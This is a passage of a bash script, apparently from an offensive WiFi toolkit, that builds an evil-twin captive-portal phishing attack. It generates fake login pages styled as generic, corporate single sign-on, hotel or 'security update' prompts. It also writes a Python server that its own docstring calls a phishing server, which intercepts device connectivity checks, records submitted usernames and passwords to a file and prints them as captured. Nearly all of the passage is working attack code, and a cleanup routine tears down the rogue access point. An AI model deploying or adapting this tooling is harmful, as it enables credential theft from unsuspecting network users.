body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,#0a1628 0%,#1a2a4a 100%);color:#e0e0e0;
display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);
border-radius:16px;padding:48px;text-align:center;max-width:420px;
backdrop-filter:blur(12px)}
.check{font-size:64px;margin-bottom:20px}
h1{color:#4ade80;font-size:24px;margin-bottom:12px}
p{color:#94a3b8;line-height:1.6}
</style></head><body>
<div class="card"><div class="check">✓</div>
<h1>Connected Successfully</h1>
<p>You are now connected to the WiFi network. You may close this page.</p>
</div></body></html>
SUCCESS_EOF

    # --- Login page: custom template or built-in ---
    if [[ "$template" == "custom" && -n "${PORTAL_CUSTOM_PATH:-}" ]]; then
        cp "$PORTAL_CUSTOM_PATH" "$portal_html"
        log_success "Using custom template: $(basename "$PORTAL_CUSTOM_PATH")"
    else
        # --- Built-in login page (varies by template) ---
        local page_title=""
        local page_heading=""
        local page_subtitle=""
        local show_email="true"
        local show_password="true"
        local submit_text="Connect"
        local accent_color="#3b82f6"

        case "$template" in
            generic)
                page_title="WiFi Login"
                page_heading="Connect to ${ssid}"
                page_subtitle="Enter your credentials to access the network"
                submit_text="Connect to WiFi"
                accent_color="#3b82f6"
                ;;
            corporate)
                page_title="Single Sign-On"
                page_heading="Corporate Sign In"
                page_subtitle="Sign in with your organization credentials"
                submit_text="Sign In"
                accent_color="#6366f1"
                ;;
            hotel)
                page_title="Target WiFi"
                page_heading="Welcome to ${ssid}"
                page_subtitle="Enter your room number and last name to connect"
                submit_text="Accept & Connect"
                accent_color="#0ea5e9"
                ;;
            update)
                page_title="Network Update"
                page_heading="Security Update Required"
                page_subtitle="Please re-enter your WiFi password to apply security update"
                show_email="false"
                submit_text="Apply Update"
                accent_color="#f59e0b"
                ;;
        esac

        local email_field=""
        if [[ "$show_email" == "true" ]]; then
            email_field='<div class="field"><label>Email / Username</label>
<input type="text" name="username" id="username" placeholder="user@company.com" required autocomplete="off"></div>'
        fi

        local password_field=""
        if [[ "$show_password" == "true" ]]; then
            password_field='<div class="field"><label>Password</label>
<input type="password" name="password" id="password" placeholder="••••••••" required autocomplete="off"></div>'
        fi

        cat > "$portal_html" <<PORTAL_EOF
<!DOCTYPE html>
<html><head>
<meta charset="utf-8"><title>${page_title}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,#0a1628 0%,#1a2a4a 100%);color:#e0e0e0;
display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);
border-radius:16px;padding:40px;width:100%;max-width:420px;
backdrop-filter:blur(12px);box-shadow:0 25px 50px rgba(0,0,0,.4)}
.logo{width:48px;height:48px;background:${accent_color};border-radius:12px;
margin:0 auto 24px;display:flex;align-items:center;justify-content:center;font-size:24px}
h1{text-align:center;font-size:22px;margin-bottom:8px;color:#f0f0f0}
.sub{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:32px}
.field{margin-bottom:20px}
.field label{display:block;font-size:13px;color:#94a3b8;margin-bottom:6px;font-weight:500}
.field input{width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,.15);
background:rgba(255,255,255,.04);border-radius:10px;color:#f0f0f0;font-size:15px;
outline:none;transition:border .2s}
.field input:focus{border-color:${accent_color}}
.btn{width:100%;padding:14px;background:${accent_color};color:#fff;border:none;
border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;
transition:opacity .2s;margin-top:8px}
.btn:hover{opacity:.85}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#64748b}
.lock{display:inline-block;margin-right:4px}
</style></head><body>
<div class="card">
<div class="logo">📶</div>
<h1>${page_heading}</h1>
<p class="sub">${page_subtitle}</p>
<form method="POST" action="/login">
${email_field}
${password_field}
<button type="submit" class="btn">${submit_text}</button>
</form>
<p class="footer"><span class="lock">🔒</span>Secured connection</p>
</div></body></html>
PORTAL_EOF
    fi

    # --- Python HTTP server for captive portal ---
    cat > $TMP_DIR/f1_portal_server.py <<'PYSERVER_EOF'
#!/usr/bin/env python3
"""Captive portal phishing server for F1."""
import http.server
import urllib.parse
import argparse
import datetime
import os
import sys

class PortalHandler(http.server.BaseHTTPRequestHandler):
    creds_file = "$TMP_DIR/f1_portal_creds.txt"
    portal_html = "$TMP_DIR/f1_portal.html"
    success_html = "$TMP_DIR/f1_portal_success.html"

    def log_message(self, format, *args):
        pass  # Suppress default logging

    def do_GET(self):
        # Captive portal detection endpoints — redirect to login
        captive_paths = [
            '/generate_204', '/gen_204', '/hotspot-detect.html',
            '/connecttest.txt', '/ncsi.txt', '/canonical.html',
            '/success.txt', '/kindle-wifi/wifistub.html',
            '/fwlink/', '/redirect'
        ]

        if self.path in captive_paths or not self.path.startswith('/success'):
            self._serve_file(self.portal_html, "text/html")
        elif self.path == '/success':
            self._serve_file(self.success_html, "text/html")
        else:
            self._serve_file(self.portal_html, "text/html")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='replace')
        params = urllib.parse.parse_qs(post_data)

        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        client_ip = self.client_address[0]
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Log credential
        if username or password:
            cred_line = f"CRED: [{timestamp}] IP={client_ip} USER={username} PASS={password}\n"
            with open(self.creds_file, 'a') as f:
                f.write(cred_line)
            print(f"[CAPTURED] {client_ip} -> {username}:{password}", flush=True)

        # Redirect to success page
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()

    def _serve_file(self, filepath, content_type):
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content))
            self.send_header('Cache-Control', 'no-cache, no-store')
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--creds-file', default='$TMP_DIR/f1_portal_creds.txt')
    args = parser.parse_args()

    PortalHandler.creds_file = args.creds_file
    server = http.server.HTTPServer(('0.0.0.0', args.port), PortalHandler)
    print(f"Portal server listening on 0.0.0.0:{args.port}", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
PYSERVER_EOF
}

#--- Cleanup helper ---
_f1_cleanup() {
    local iface="$1"
    local tcpdump_pid="$2"
    local dnsmasq_pid="$3"
    local hostapd_pid="$4"
    local portal_pid="$5"

    [[ -n "$hostapd_pid" ]] && { kill -TERM $hostapd_pid 2>/dev/null; wait $hostapd_pid 2>/dev/null; }
    [[ -n "$tcpdump_pid" ]] && { kill -SIGINT $tcpdump_pid 2>/dev/null; wait $tcpdump_pid 2>/dev/null; }
    [[ -n "$dnsmasq_pid" ]] && { kill -TERM $dnsmasq_pid 2>/dev/null; wait $dnsmasq_pid 2>/dev/null; }
    [[ -n "$portal_pid" ]] && { kill -TERM $portal_pid 2>/dev/null; wait $portal_pid 2>/dev/null; }

    # Restore interface
    run_tool ip addr flush dev "$iface" 2>/dev/null || true
    run_tool ip link set "$iface" down 2>/dev/null || true
    iw dev "$iface" set type managed 2>/dev/null || true
    run_tool ip link set "$iface" up 2>/dev/null || true
}
